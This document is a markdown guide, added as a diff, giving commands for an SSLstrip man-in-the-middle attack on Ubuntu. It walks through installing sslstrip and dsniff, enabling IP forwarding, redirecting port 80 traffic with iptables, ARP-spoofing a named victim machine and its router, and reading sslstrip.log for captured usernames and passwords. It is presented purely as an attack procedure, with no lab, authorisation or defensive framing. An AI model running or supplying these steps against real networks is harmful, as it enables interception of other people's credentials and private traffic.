@@ -1,0 +1,112 @@
+### **Comprehensive Step-by-Step Guide to Setting Up, Running, and Using SSLstrip for SSL Attacks on Ubuntu Using apt install, IP Forwarding, iptables, and ARP Spoofing**
+
+#### **Step 1: Install Dependencies**
+
+Before installing `sslstrip`, you need to ensure that `libpcap-dev` is installed. Run the following command:
+
+  
+sudo apt install -y libpcap-dev
+
+#### **Step 2: Install SSLstrip via apt**
+
+Install `sslstrip` using the `apt` package manager by running this command:
+
+  
+sudo apt install -y sslstrip
+
+#### **Step 3: Enable IP Forwarding Permanently**
+
+To enable IP forwarding so that your machine can route packets between devices, edit the sysctl configuration file:
+
+  
+sudo nano /etc/sysctl.conf
+
+Find this line:
+
+  
+#net.ipv4.ip_forward=1
+
+Uncomment it by removing the `#` at the beginning, so it becomes:
+
+  
+net.ipv4.ip_forward=1
+
+Save and exit the file. To apply this change immediately, run:
+
+  
+sudo sysctl -p
+
+This makes IP forwarding persistent across reboots.
+
+#### **Step 4: Configure iptables for Traffic Redirection**
+
+Use `iptables` to redirect all HTTP traffic (port 80) to port 8080, which `sslstrip` will listen on:
+
+  
+sudo iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-ports 8080
+
+This rule ensures that all HTTP traffic passing through the machine is redirected to `sslstrip`. When you are finished with the attack, you can remove the rule by running:
+
+  
+sudo iptables --flush
+
+#### **Step 5: Run SSLstrip**
+
+Now, start `sslstrip` so that it listens for redirected traffic on port 8080:
+
+  
+sudo sslstrip -l 8080
+
+This command launches `sslstrip`, which will strip the HTTPS layer from any intercepted traffic and log the plaintext information.
+
+#### **Step 6: Perform ARP Spoofing (Man-In-The-Middle Attack)**
+
+You will need to perform ARP spoofing to position yourself as a Man-in-the-Middle. First, install `arpspoof`:
+
+  
+sudo apt install dsniff
+
+Next, run the following command to perform ARP spoofing between the target machine and the router:
+
+  
+sudo arpspoof -i <interface> -t <target-ip> -r <router-ip>
+
+Replace:
+- `<interface>` with your network interface (e.g., `eth0`, `wlan0`).
+- `<target-ip>` with the IP address of the victim machine.
+- `<router-ip>` with the IP address of the router.
+
+This command will poison the ARP tables, allowing you to intercept the traffic between the victim and the router.
+
+#### **Step 7: Monitor Logs**
+
+All intercepted traffic will be saved in the `sslstrip.log` file. You can view the captured data using:
+
+  
+cat sslstrip.log
+
+This will display any usernames, passwords, or other sensitive information captured by `sslstrip`.
+
+#### **Step 8: Disable IP Forwarding and Clean Up**
+
+When you are done, you can disable IP forwarding with this command:
+
+  
+sudo sysctl -w net.ipv4.ip_forward=0
+
+This command ensures that your machine stops forwarding packets between other network devices.
+
+Also, clear any remaining `iptables` rules with:
+
+  
+sudo iptables --flush
+
+This will remove all the traffic redirection rules that were set up earlier.
+
+#### **Step 9: Stop ARP Spoofing**
+
+Once you are done, stop `arpspoof` by pressing `Ctrl+C` in the terminal window where it is running.
+
+---
+
+This comprehensive tutorial provided a step-by-step guide to setting up and using **SSLstrip** for performing an SSL attack on Ubuntu. It covers the installation of `sslstrip` using the **apt** package manager, enabling **IP forwarding**, configuring **iptables** for traffic redirection, running **ARP spoofing** using **arpspoof**, and monitoring captured logs.
